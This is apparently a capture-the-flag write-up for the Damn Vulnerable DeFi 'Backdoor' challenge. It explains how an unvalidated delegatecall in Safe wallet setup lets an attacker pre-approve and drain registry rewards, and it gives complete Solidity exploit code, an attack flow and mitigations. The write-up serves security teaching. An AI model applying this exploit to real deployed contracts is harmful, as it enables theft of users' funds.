# Backdoor - Solution

## Challenge Overview

A registry of Safe (Gnosis Safe) wallets incentivizes team members to create secure wallets. When a beneficiary deploys and registers a wallet, they receive 10 DVT tokens.

**Initial conditions:**
- 4 beneficiaries: Alice, Bob, Charlie, David
- Registry has 40 DVT tokens (10 per beneficiary)
- Registry validates wallet creation parameters

**Goal:** Steal all 40 DVT tokens in a single transaction

## The Vulnerability

### Safe.setup() Delegatecall Parameter

The `Safe.setup()` function allows executing a delegatecall during wallet initialization:

```solidity
function setup(
    address[] calldata _owners,
    uint256 _threshold,
    address to,              // ← Target for delegatecall
    bytes calldata data,     // ← Data for delegatecall
    address fallbackHandler,
    address paymentToken,
    uint256 payment,
    address payable paymentReceiver
) external
```

The `to` and `data` parameters allow arbitrary code execution in the context of the newly created wallet. This is by design for Safe, allowing modules/features to be initialized.

### What the Registry Validates

```solidity
// ✓ Caller must be the factory
if (msg.sender != walletFactory) revert CallerNotFactory();

// ✓ Must use the correct singleton
if (singleton != singletonCopy) revert FakeSingletonCopy();

// ✓ Must call setup function
if (bytes4(initializer[:4]) != Safe.setup.selector) revert InvalidInitialization();

// ✓ Threshold must be 1
if (threshold != EXPECTED_THRESHOLD) revert InvalidThreshold(threshold);

// ✓ Must have exactly 1 owner
if (owners.length != EXPECTED_OWNERS_COUNT) revert InvalidOwnersCount(owners.length);

// ✓ Owner must be a beneficiary
if (!beneficiaries[walletOwner]) revert OwnerIsNotABeneficiary();

// ✓ Fallback handler must be address(0)
if (fallbackManager != address(0)) revert InvalidFallbackManager(fallbackManager);
```

### What the Registry DOESN'T Validate

- **The `to` address** (delegatecall target)
- **The `data` parameter** (delegatecall data)

This allows us to execute arbitrary code during wallet initialization!

## Exploit Strategy

1. **Create a helper contract** that approves token spending
2. **For each beneficiary**, create a Safe wallet where:
   - The owner is the beneficiary (passes validation)
   - The `to` parameter points to our helper
   - The `data` parameter approves our attacker for max tokens
3. **Registry validates the wallet** and sends 10 DVT to it
4. **Our attacker transfers the tokens** (already approved) to recovery

## Solution Code

```solidity
// Helper contract called via delegatecall
contract TokenApprover {
    function approve(address token, address spender, uint256 amount) external {
        DamnValuableToken(token).approve(spender, amount);
    }
}

contract BackdoorAttacker {
    constructor(
        SafeProxyFactory walletFactory,
        address singletonCopy,
        WalletRegistry walletRegistry,
        DamnValuableToken token,
        address[] memory beneficiaries,
        address recovery
    ) {
        // Deploy helper that will be delegatecalled
        TokenApprover approver = new TokenApprover();

        for (uint256 i = 0; i < beneficiaries.length; i++) {
            address beneficiary = beneficiaries[i];

            // Single owner (the beneficiary)
            address[] memory owners = new address[](1);
            owners[0] = beneficiary;

            // Malicious delegatecall data - approve this contract
            bytes memory approveData = abi.encodeCall(
                TokenApprover.approve,
                (address(token), address(this), type(uint256).max)
            );

            // Full Safe.setup call
            bytes memory initializer = abi.encodeCall(
                Safe.setup,
                (
                    owners,            // _owners
                    1,                 // _threshold (must be 1)
                    address(approver), // to - delegatecall target
                    approveData,       // data - delegatecall data
                    address(0),        // fallbackHandler (must be 0)
                    address(0),        // paymentToken
                    0,                 // payment
                    payable(address(0)) // paymentReceiver
                )
            );

            // Create wallet with callback to registry
            SafeProxy proxy = walletFactory.createProxyWithCallback(
                singletonCopy,
                initializer,
                0,
                walletRegistry
            );

            // Wallet now has 10 DVT and approved us - drain it
            token.transferFrom(address(proxy), recovery, 10e18);
        }
    }
}
```

## Attack Flow

```
Attacker Constructor
    │
    ├── Deploy TokenApprover helper
    │
    └── For each beneficiary (Alice, Bob, Charlie, David):
            │
            ├── Build setup initializer with:
            │   • Owner = beneficiary
            │   • Delegatecall to TokenApprover.approve()
            │
            ├── createProxyWithCallback()
            │       │
            │       ├── Create new Safe proxy
            │       ├── Safe.setup() → delegatecall to TokenApprover
            │       │   └── approve(token, attacker, MAX)
            │       └── Callback to WalletRegistry.proxyCreated()
            │           └── Transfer 10 DVT to wallet
            │
            └── token.transferFrom(wallet, recovery, 10 DVT)
                    └── (Approval was set during setup!)
```

## Why This Works

1. **Delegatecall context**: When the wallet delegatecalls to `TokenApprover.approve()`, the call executes in the wallet's context, so `token.approve()` sets approval for the wallet's tokens.

2. **Order of operations**: The approval happens BEFORE the registry sends tokens, but that's fine - the approval persists after tokens arrive.

3. **Single transaction**: Everything happens in the attacker's constructor, satisfying the "single transaction" requirement.

## Mitigation Recommendations

1. **Validate delegatecall parameters**: Require `to` to be `address(0)` or a whitelisted address:
   ```solidity
   (address[] memory owners, uint256 threshold, address to, bytes memory data, ...) = 
       abi.decode(initializer[4:], (...));
   if (to != address(0)) revert InvalidDelegatecallTarget();
   ```

2. **Add a timelock**: Require wallets to exist for some time before receiving rewards

3. **Use a whitelist**: Only allow specific callback mechanisms during setup

4. **Change reward mechanism**: Instead of auto-sending tokens, require beneficiaries to manually claim after wallet verification

